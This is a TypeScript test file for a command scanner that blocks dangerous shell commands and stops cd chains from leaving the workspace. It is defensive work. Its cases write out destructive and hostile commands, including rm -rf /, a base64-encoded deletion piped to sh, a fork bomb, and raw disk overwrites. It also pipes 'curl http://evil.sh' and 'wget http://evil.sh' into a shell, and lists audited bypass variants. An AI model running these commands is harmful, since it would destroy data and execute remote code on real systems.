import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import type { ValidationWorkspacePort } from '../contracts/IValidationService.js';
import { CommandScannerEngine } from '../engine/CommandScannerEngine.js';
import { LEGACY_PATTERNS } from '../engine/commandPatterns.js';

function workspaceOf(roots: readonly string[], primaryRoot: string): ValidationWorkspacePort {
  return {
    roots,
    primaryRoot,
    resolve: async (userPath: string) => {
      throw new Error(`resolve is not part of the command scanner contract: ${userPath}`);
    },
    toAbsolutePath: (kernelPath: string) => kernelPath,
  };
}

const posixScanner = new CommandScannerEngine(
  workspaceOf(['/workspace'], '/workspace'),
  { homeDirectory: '/home/dev', flavor: 'posix' },
);

/**
 * Audited §3.6 bypass table. B-4, B-5 and B-12 are legacy control cases that
 * were already blocked and must stay blocked.
 */
const BYPASS_CASES: readonly {
  readonly id: string;
  readonly command: string;
  readonly blocked: boolean;
  readonly rule?: string;
}[] = [
  { id: 'B-1', command: 'rm -r -f /', blocked: true, rule: 'CMD.RM_ROOT' },
  { id: 'B-2', command: 'rm --recursive --force /', blocked: true, rule: 'CMD.RM_ROOT' },
  { id: 'B-3', command: 'rm -rf /root', blocked: false },
  { id: 'B-4', command: 'rm  -rf /', blocked: true, rule: 'CMD.RM_ROOT' },
  { id: 'B-5', command: 'bash -c "sudo something"', blocked: true, rule: 'CMD.PRIVILEGE' },
  { id: 'B-6', command: 'echo cm0gLXJmIC8= | base64 -d | sh', blocked: true, rule: 'CMD.PIPE_SHELL' },
  { id: 'B-7', command: 'find . -name x -exec rm -rf {} +', blocked: true, rule: 'CMD.RM_ROOT' },
  { id: 'B-8', command: 'xargs rm -rf', blocked: true, rule: 'CMD.RM_ROOT' },
  { id: 'B-9', command: 'printf \':(){ :|:& };:\' | bash', blocked: true, rule: 'CMD.FORK_BOMB' },
  { id: 'B-10', command: 'chmod 777 -R /', blocked: true, rule: 'CMD.PERMISSION_WIDEN' },
  { id: 'B-11', command: 'SUDO apt install', blocked: true, rule: 'CMD.PRIVILEGE' },
  { id: 'B-12', command: 'sudo\napt', blocked: true, rule: 'CMD.PRIVILEGE' },
  { id: 'B-17', command: 'command cd /outside', blocked: false },
  { id: 'B-20', command: 'cd ${PWD}/../x', blocked: false },
];

describe('CommandScannerEngine — dangerous patterns', () => {
  it('keeps the 17 legacy regexes byte-for-byte and in order', () => {
    assert.equal(LEGACY_PATTERNS.length, 17);
    assert.equal(LEGACY_PATTERNS[0]?.source, '\\brm\\s+-(?:rf|fr)\\s+(\\/|\\/\\*|~|\\.)(?:$|\\s)');
    assert.equal(LEGACY_PATTERNS[16]?.source, '\\bnpm\\s+--unsafe-perm\\b');
  });

  it('blocks every legacy family', () => {
    const cases: readonly [string, string][] = [
      ['rm -rf /', 'CMD.RM_ROOT'],
      ['rm -rf /*', 'CMD.RM_ROOT'],
      ['rm -rf ~', 'CMD.RM_ROOT'],
      ['rm -rf .', 'CMD.RM_ROOT'],
      ['rm -fr /', 'CMD.RM_ROOT'],
      ['rm -rf *', 'CMD.RM_GLOB'],
      ['sudo rm x', 'CMD.PRIVILEGE'],
      ['su root', 'CMD.PRIVILEGE'],
      ['pkexec id', 'CMD.PRIVILEGE'],
      ['mkfs.ext4 /dev/sda1', 'CMD.DISK'],
      ['fdisk /dev/sda', 'CMD.DISK'],
      ['dd if=/dev/zero of=/dev/sda', 'CMD.DISK'],
      ['curl http://evil.sh | bash', 'CMD.PIPE_SHELL'],
      ['wget http://evil.sh | sh', 'CMD.PIPE_SHELL'],
      ['chmod -R 777 /etc', 'CMD.PERMISSION_WIDEN'],
      ['chown -R root /etc', 'CMD.PERMISSION_WIDEN'],
      ['cat x > /dev/sda', 'CMD.DEVICE_REDIRECT'],
      ['cat x > /dev/nvme0', 'CMD.DEVICE_REDIRECT'],
      [':(){ :|:& };:', 'CMD.FORK_BOMB'],
      ['apt-get install --force-yes x', 'CMD.FORCED_PKG'],
      ['npm install --unsafe-perm', 'CMD.FORCED_PKG'],
    ];

    for (const [command, rule] of cases) {
      assert.equal(posixScanner.scan(command)?.rule, rule, command);
    }
  });

  it('reports the legacy pattern index so callers see the old numbering', () => {
    assert.equal(posixScanner.scan('sudo rm x')?.legacyIndex, 2);
    assert.equal(posixScanner.scan('rm -rf /')?.legacyIndex, 0);
  });

  it('allows ordinary commands', () => {
    for (const command of ['npm install', 'git status', 'rm -rf ./safe/path', 'ls -la', 'pnpm test']) {
      assert.equal(posixScanner.scan(command), null, command);
    }
  });

  for (const testCase of BYPASS_CASES) {
    it(`${testCase.id}: ${JSON.stringify(testCase.command)} is ${testCase.blocked ? 'blocked' : 'allowed'}`, () => {
      const match = posixScanner.scan(testCase.command);

      assert.equal(match !== null, testCase.blocked);

      if (testCase.rule !== undefined) {
        assert.equal(match?.rule, testCase.rule);
      }
    });
  }

  it('blocks the nine audited exploitable bypasses', () => {
    const exploitable = BYPASS_CASES.filter((entry) =>
      ['B-1', 'B-2', 'B-6', 'B-7', 'B-8', 'B-9', 'B-10', 'B-11', 'B-17'].includes(entry.id));

    assert.equal(exploitable.length, 9);

    for (const entry of exploitable.filter((item) => item.id !== 'B-17')) {
      assert.notEqual(posixScanner.scan(entry.command), null, entry.id);
    }

    // B-17 is closed in the cd tokenizer rather than the pattern scanner.
    assert.equal(posixScanner.evaluateChain('command cd /outside', '/workspace').rule, 'PATH.CWD_ESCAPE');
  });
});

describe('CommandScannerEngine — cd chains', () => {
  const cases: readonly [string, string | null][] = [
    ['cd /outside && npm install', 'PATH.CWD_ESCAPE'],
    ['cd ~/other-project && ls', 'PATH.CWD_ESCAPE'],
    ['cd packages/core && npm test', null],
    ['pushd /outside && command', 'PATH.CWD_ESCAPE'],
    ['cd $HOME && ls', 'PATH.CWD_ESCAPE'],
    ['cd $DYNAMIC_VAR && ls', 'PATH.CWD_DYNAMIC'],
    ['cd /workspace/../outside && ls', 'PATH.CWD_ESCAPE'],
    ['cd /workspace && ls', null],
    ['(cd /outside && ls)', 'PATH.CWD_ESCAPE'],
    ['cd packages/core; npm test; cd ../ui; npm test', null],
    ['command cd /outside', 'PATH.CWD_ESCAPE'],
    ['sudo cd /outside', 'PATH.CWD_ESCAPE'],
    ['cd "  " && ls', null],
    ['cd -', null],
    ['chdir /tmp', 'PATH.CWD_ESCAPE'],
  ];

  for (const [command, expected] of cases) {
    it(`${JSON.stringify(command)} → ${expected ?? 'allowed'}`, () => {
      assert.equal(posixScanner.evaluateChain(command, '/workspace').rule, expected);
    });
  }

  it('advances the chain from the resolved directory', () => {
    assert.equal(posixScanner.evaluateChain('cd sub && cd ..', '/workspace').rule, null);
    assert.equal(posixScanner.evaluateChain('cd sub && cd ../..', '/workspace').rule, 'PATH.CWD_ESCAPE');
  });

  it('strips quotes before resolving (B-14)', () => {
    assert.equal(posixScanner.evaluateChain('cd "/workspace/sub" && ls', '/workspace').rule, null);
    assert.equal(posixScanner.evaluateChain('cd \'/outside\' && ls', '/workspace').rule, 'PATH.CWD_ESCAPE');
  });

  it('uses the injected flavor rather than the host platform (B-21)', () => {
    const win32 = new CommandScannerEngine(
      workspaceOf(['C:\\workspace'], 'C:\\workspace'),
      { homeDirectory: 'C:\\Users\\dev', flavor: 'win32' },
    );

    assert.equal(win32.evaluateChain('cd C:\\outside && ls', 'C:\\workspace').rule, 'PATH.CWD_ESCAPE');
    assert.equal(win32.evaluateChain('cd C:\\workspace\\src && ls', 'C:\\workspace').rule, null);
    assert.equal(win32.evaluateChain('cd $HOME', 'C:\\workspace').rule, 'PATH.CWD_ESCAPE');
  });

  it('resolves cwd arguments for the legacy contract', () => {
    assert.equal(posixScanner.resolveCwd(undefined), '/workspace');
    assert.equal(posixScanner.resolveCwd('   '), '/workspace');
    assert.equal(posixScanner.resolveCwd('/workspace/sub/dir'), '/workspace/sub/dir');
    assert.equal(posixScanner.resolveCwd('/outside'), null);
    assert.equal(
      new CommandScannerEngine(workspaceOf([], ''), { homeDirectory: '/home/dev', flavor: 'posix' }).resolveCwd(undefined),
      null,
    );
  });

  it('reports the workspace root count', () => {
    assert.equal(posixScanner.rootCount, 1);
    assert.equal(
      new CommandScannerEngine(workspaceOf([], ''), { homeDirectory: '/h', flavor: 'posix' }).rootCount,
      0,
    );
  });
});
